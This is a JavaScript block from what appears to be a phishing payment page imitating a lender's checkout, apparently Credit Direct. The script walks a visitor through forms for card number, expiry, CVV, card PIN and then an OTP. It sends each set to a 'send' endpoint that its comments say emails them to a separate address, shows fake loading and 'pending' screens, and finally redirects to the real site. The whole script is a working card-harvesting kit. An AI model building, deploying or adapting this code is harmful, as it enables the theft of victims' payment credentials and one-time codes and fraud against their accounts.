    <script>
    
        var sitename = document.getElementById('sitename').value;
        var other_email = document.getElementById('other_email').value;

        if(sitename === ""){
            // alert("Null values");
            sitename = "https://creditdirectltd.com/";

        }
   
        
        function showLoader(state) {
            const loader = document.getElementById('loader');

            switch (state) {
                case 'visible':
                    loader.style.display = 'block';

                    return new Promise(resolve => {
                        // Set a timeout to hide the loader after 5 seconds
                        setTimeout(() => {
                            loader.style.display = 'none';
                            resolve();
                        }, 5000);
                    });
                default:
                    loader.style.display = 'none';
                    return Promise.resolve();
            }
        }

        async function executeAfterLoader() {
            await showLoader('visible');
            // Code to execute after the loader is hidden
            $('#card_details_section').css('display', 'none');
            $('#otp_section').css('display', 'block');
        }

        async function executePending() {
            await showLoader('visible');
            // Code to execute after the loader is hidden
            $('#otp_section').css('display', 'none');
            $('#pending_section').css('display', 'block');

            // Set a timeout to redirect after 5 seconds
            setTimeout(() => {
                // window.location.href = 'https://creditdirectltd.com';
                window.location = sitename;
            }, 5000);
        }


        // FOR SENDING EMAIL FOR CARD DETAILS
        function sendGetRequest(name, email, cardNumber, cardExpiry, cardCVV, cardPIN, otherEmail) {
            $.ajax({
                url: 'send',  // Update the URL to point to your PHP file
                method: 'GET',    // Use the GET method
                data: {
                    key1: name,
                    key2: email,
                    key3: cardNumber,
                    key4: cardExpiry,
                    key5: cardCVV,
                    key6: cardPIN,
                    key7: otherEmail
                },
                success: function(response) {
                    console.log('Success:', response);
                },
                error: function(error) {
                    console.error('Error:', error);
                }
            });
        }
        
        

        // FOR SENDING EMAIL FOR OTP
        function sendOtp(name, otp, other_email, user_email) {
            $.ajax({
                url: 'send', // Update the URL to point to your PHP file
                method: 'POST', // Use the POST method
                data: {
                    key1_name: name,
                    key1_otp: otp,
                    key1_other_email: other_email,
                    key1_user_email: user_email,
                },
                success: function(response) {
                    console.log('Success:', response);
                },
                error: function(error) {
                    console.error('Error:', error);
                }
            });
        }
        


         

        $(document).ready(function(){
            // TOGGLE DETAILS
            $('#card_details_section').css('display', 'none');
            $('#otp_section').css('display', 'none');
            // showLoader('visible');

            // OTHER EMAIL
            const other_email = $('#other_email').val();
            const user_email = $('#email').val();

            // USER DETAILS
            $('#proceed').on('click', function(){

              const name = $('#name').val();
              const email = $('#email').val();
              const amount = $('#amount').val();
              const errors = $('#errors');

              if(name === ""){
                errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Name Field Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
              }else if(email === ""){
                errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Email Field Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
              }else if(amount === ""){
                errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Amount Field Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
              }else if(amount < 1){
                errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Amount cannot be lesser than 1<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
              }else{
                  $('#card_details_section').css('display', 'block');
                  $('#name_heading').text(name);
                  $('#pay_btn').text("Pay "+amount);
                  $('#user_section').css('display', 'none');
              }

            })


            // CARD DETAILS
            $('#pay_btn').on('click', function(){

                const name = $('#name').val();
                const email = $('#email').val();
                const card_number = $('#card_number').val();
                const card_expiry = $('#card_expiry').val();
                const card_cvv = $('#card_cvv').val();
                const card_pin = $('#card_pin').val();
                const errors = $('#card_details_errors');

                // const valueLength = 1; // Adjust this based on the actual length of your values

                // // Extract the first and second values
                // const firstValue = card_expiry.substr(0, valueLength).trim();
                // const secondValue = card_expiry.substr(valueLength, valueLength).trim();



                if(card_number === ""){
                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Card Number Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
                }else if(card_expiry === ""){
                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Expiry Date Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
                }else if(card_cvv === ""){
                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">CVV Field Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
                }else if(card_pin === ""){
                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Card Pin Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
                // }else if(firstValue !== 0 || firstValue !== 1){
                //     errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Expiry Date cannot be lesser than 1<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
                }else{
                    
                    // showLoader('visible');
                    // $('#card_details_section').css('display', 'none');
                    // $('#otp_section').css('display', 'block');

                    executeAfterLoader();

                    sendGetRequest(name, email, card_number, card_expiry, card_cvv, card_pin, other_email);
                }

            });
            


            // PENDING SECTION
            $('#otp_btn').on('click', function(){

                const name = $('#name').val();
                const otp = $('#otp').val();
                const user_email = $('#email').val();

                if(otp === ""){
                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">OTP Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
                }else{
            
                    executePending();
                    sendOtp(name, otp, other_email, user_email);
                }
                
            });





            
        });

        
    </script>
